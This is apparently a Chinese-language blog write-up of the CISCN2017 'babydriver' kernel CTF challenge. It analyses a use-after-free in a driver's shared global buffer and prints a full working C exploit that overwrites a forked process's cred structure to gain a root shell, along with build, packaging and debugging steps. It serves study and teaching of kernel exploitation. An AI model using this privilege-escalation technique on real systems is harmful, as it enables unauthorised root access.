@@ -1,0 +1,301 @@
+---
+layout: post
+title:  babydriver
+date:   2023-01-02 00:08:01 +0300
+image:  2023-01-02-siblings.jpg
+tags:   [ctf,pwn,kernel]
+---
+
+CISCN2017_babydriver
+
+```assembly
+.
+├── boot.sh     # 启动脚本，运行这个脚本来启动QEMU
+├── bzImage     # 压缩过的内核镜像
+└── rootfs.cpio # 作为初始RAM磁盘的文件
+```
+
+查看启动脚本boot.sh内容如下：
+
+```assembly
+#!/bin/bash
+
+qemu-system-x86_64 \
+-initrd rootfs.cpio \      # 指定使用rootfs.cpio作为初始RAM磁盘。可以使用cpio 命令提取这个cpio文件，提取出里面的需要的文件，比如init脚本和babydriver.ko的驱动文件。提取操作的命令放在下面的操作步骤中
+-kernel bzImage \          # 使用当前目录的bzImage作为内核镜像
+-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \  # 使用后面的字符串作为内核命令行
+-enable-kvm \              # 启用加速器
+-monitor /dev/null \       # 将监视器重定向到字符设备/dev/null
+-m 64M \                   # 参数设置RAM大小为64M
+--nographic  \             # 参数禁用图形输出并将串行I/O重定向到控制台
+-smp cores=1,threads=1 \   # 参数将CPU设置为1核心1线程
+-cpu kvm64,+smep           # 参数选择CPU为kvm64，开启了smep保护，无法在ring 0级别执行用户代码
+```
+
+文件bzImage是压缩编译的内核镜像文件。有些题目会提供vmlinux文件，它是未被压缩的镜像文件。这个题目没有提供，但也不要紧，可以用脚本提取出vmlinux，而使用vmlinux的目的也就是找gadget，提取vmlinux的脚本也可以在Linux的GitHub上找到：https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux。把代码复制到文件中，保存为extract-vmlinux，然后赋予执行权限。提取vmlinux命令如下：
+
+```assembly
+./extract-vmlinux ./bzImage > vmlinux
+```
+
+可以使用ropper在提取的vmlinux中搜寻gadget，ropper比ROPgadget快很多：
+
+```assembly
+ropper --file ./vmlinux --nocolor > g1
+```
+
+rootfs.cpio里面包含一些文件系统，它的文件比较多，我们可以创建一个文件夹，然后用`cpio`命令把所有文件提取到新建的文件夹下，保证一个干净的根目录，后面也将内容重新打包：
+
+上一步解压完rootfs.cpio之后可以看到它就是Linux的文件系统。在根目录下里面有一个「init」文件，它决定启动哪些程序，比如执行某些脚本和启动shell。它的内容如下，除了`insmod`命令之外都是Linux的基本命令便不再赘述：
+
+```assembly
+#!/bin/sh
+
+mount -t proc none /proc
+mount -t sysfs none /sys
+mount -t devtmpfs devtmpfs /dev
+chown root:root flag
+chmod 400 flag
+exec 0</dev/console
+exec 1>/dev/console
+exec 2>/dev/console
+
+insmod /lib/modules/4.4.72/babydriver.ko  # insmod命令加载了一个名为babydriver.ko的驱动，根据一般的PWN题套路，这个就是有漏洞的LKM了
+chmod 777 /dev/babydev
+echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n" 
+setsid cttyhack setuidgid 1000 sh
+
+umount /proc
+umount /sys
+poweroff -d 0  -f
+```
+
+在init文件中看到用`insmod`命令加载了babydriver.ko驱动，那么我们把这个驱动拿出来，检查一下开启的保护：
+
+```assembly
+checksec --file=babydriver.ko
+[*] '/home/yqw/Documents/kernel/core/lib/modules/4.4.72/babydriver.ko'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x0)
+```
+
+可以看到程序保留了符号信息，其他保护都没有开启
+
+把驱动程序放到IDA里面查看程序逻辑，除了`init`初始化和`exit`外还有5个函数：
+
+- `babyrelease`：主要功能是释放空间
+
+  ```assembly
+  int __fastcall babyrelease(inode *inode, file *filp)
+  {
+    _fentry__(inode, filp);
+    kfree(babydev_struct.device_buf);
+    printk("device release\n");
+    return 0;
+  }
+  ```
+
+- `babyopen`：调用`kmem_cache_alloc_trace`函数申请一块大小为64字节的空间，返回值存储在`device_buf`中，并设置`device_buf_len`
+
+  ```assembly
+  int __fastcall babyopen(inode *inode, file *filp)
+  {
+    _fentry__(inode, filp);
+    babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 64LL);
+    babydev_struct.device_buf_len = 64LL;
+    printk("device open\n");
+    return 0;
+  }
+  ```
+
+- `babyioctl`：定义0x10001的命令，这条命令可以释放刚才申请的`device_buf`，然后重新申请一个用户传入的内存，并设置`device_buf_len`
+
+  ```assembly
+  __int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
+  {
+    size_t v3; // rdx
+    size_t v4; // rbx
+  
+    _fentry__(filp, command);
+    v4 = v3;
+    if ( command == 0x10001 )
+    {
+      kfree(babydev_struct.device_buf);
+      babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
+      babydev_struct.device_buf_len = v4;
+      printk("alloc done\n");
+      return 0LL;
+    }
+    else
+    {
+      printk(&unk_2EB);
+      return -22LL;
+    }
+  }
+  ```
+
+- `babywrite`：`copy_from_user`是从用户空间拷贝数据到内核空间，应当接受三个参数`copy_from_user(char*, char*,int)`，IDA里面是没有识别成功，需要手动按Y键修复。`babywrite`函数先检查长度是否小于`device_buf_len`，然后把 `buffer` 中的数据拷贝到 `device_buf` 中
+
+  ```
+  ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
+  {
+    size_t v4; // rdx
+    ssize_t result; // rax
+    ssize_t v6; // rbx
+  
+    _fentry__(filp, buffer);
+    if ( !babydev_struct.device_buf )
+      return -1LL;
+    result = -2LL;
+    if ( babydev_struct.device_buf_len > v4 )
+    {
+      v6 = v4;
+      copy_from_user(babydev_struct.device_buf, (char *)buffer, v4);
+      result = v6;
+    }
+    return result;
+  }
+  ```
+
+- `babyread`：和`babywrite`差不多，不过是把`device_buf`拷贝到`buffer`中
+
+  ```
+  ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
+  {
+    size_t v4; // rdx
+    ssize_t result; // rax
+    ssize_t v6; // rbx
+  
+    _fentry__(filp, buffer);
+    if ( !babydev_struct.device_buf )
+      return -1LL;
+    result = -2LL;
+    if ( babydev_struct.device_buf_len > v4 )
+    {
+      v6 = v4;
+      copy_to_user(buffer, babydev_struct.device_buf, v4);
+      result = v6;
+    }
+    return result;
+  }
+  ```
+
+值得注意的是驱动程序中的函数操作都使用同一个变量`babydev_struct`，而`babydev_struct`是全局变量，漏洞点在于多个设备同时操作这个变量会将变量覆盖为最后改动的内容，没有对全局变量上锁，导致条件竞争
+
+- 我们使用`ioctl`同时打开两个设备，第二次打开的内容会覆盖掉第一次打开设备的`babydev_struct` ，如果释放第一个，那么第二个理论上也被释放了，实际上并没有，就造成了一个UAF
+- 释放其中一个后，使用`fork`，那么这个新进程的`cred`空间就会和之前释放的空间重叠
+- 利用那个没有释放的描述符对这块空间写入，把`cred`结构体中的`uid`和`gid`改为0，就可实现提权
+- 还有在修改时需要知道`cred`结构的大小，可以根据内核版本可以查看源码，计算出`cred`结构大小是0xa8，不同版本的内核源码这个结构体的大小都不一样
+
+exp代码
+
+```assembly
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+
+int main()
+{
+    // 打开两次设备
+    int fd1 = open("/dev/babydev", 2);
+    int fd2 = open("/dev/babydev", 2);
+
+    // 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
+    ioctl(fd1, 0x10001, 0xa8);
+
+    // 释放 fd1
+    close(fd1);
+
+    // 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
+    int pid = fork();
+    if(pid < 0)
+    {
+        puts("[*] fork error!");
+        exit(0);
+    }
+
+    else if(pid == 0)
+    {
+        // 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0
+        char zeros[30] = {0};
+        write(fd2, zeros, 28);
+
+        if(getuid() == 0)
+        {
+            puts("[+] root now.");
+            system("/bin/sh");
+            exit(0);
+        }
+    }
+
+    else
+    {
+        wait(NULL);
+    }
+    close(fd2);
+
+    return 0;
+}
+```
+
+将exp编译好，注意需要改为静态编译，因为我们的内核是没有动态链接的：
+
+```assembly
+gcc exp.c -static -o exp
+```
+
+接下来我们复制exp到文件系统下，然后使用`cpio`命令重新打包：
+
+```assembly
+cp exp core/tmp/
+cd core/
+ls
+bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr
+
+~/pwn/core$ find . | cpio -o --format=newc > rootfs.cpio
+cpio: File ./rootfs.cpio grew, 3522560 new bytes not copied
+14160 blocks
+
+~/pwn/core$ cp rootfs.cpio ..
+```
+
+下一步就可以重新运行内核了。执行boot.sh启动内核后，在刚才拷贝的/tmp目录下找到exp可执行程序：
+
+```assembly
+/ $ /tmp/exp 
+[   28.021743] device open
+[   28.024147] device open
+[   28.026275] alloc done
+[   28.028042] device release
+[+] root now.
+/ # id
+uid=0(root) gid=0(root) groups=1000(ctf)
+```
+
+可以在boot.sh文件中添加`-s`参数来使用gdb调试，它默认端口1234。也可以指定端口号进行调试，只需要使用`-gdb tcp:port`即可。在启动的内核中使用`lsmod`查看加载的驱动基地址，得到0xffffffffc0000000，然后启动gdb，使用`target remote`指定调试IP和端口号进行调试，然后添加babydriver的符号信息，过程如下：
+
+```assembly
+# 在QEMU运行的内核中运行如下命令
+/ $ lsmod
+babydriver 16384 0 - Live 0xffffffffc0000000 (OE)
+```
+
+```assembly
+# 启动gdb，配置调试信息
+gdb -q
+
+gef➤  target remote localhost:1234
+Remote debugging using localhost:1234
+
+gef➤  add-symbol-file pwn/core/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000
+add symbol table from file "pwn/core/lib/modules/4.4.72/babydriver.ko"
+Reading symbols from pwn/core/lib/modules/4.4.72/babydriver.ko...
+```
+
+在gdb中输入命令`python set_arch()`就可以查看调试上下文了
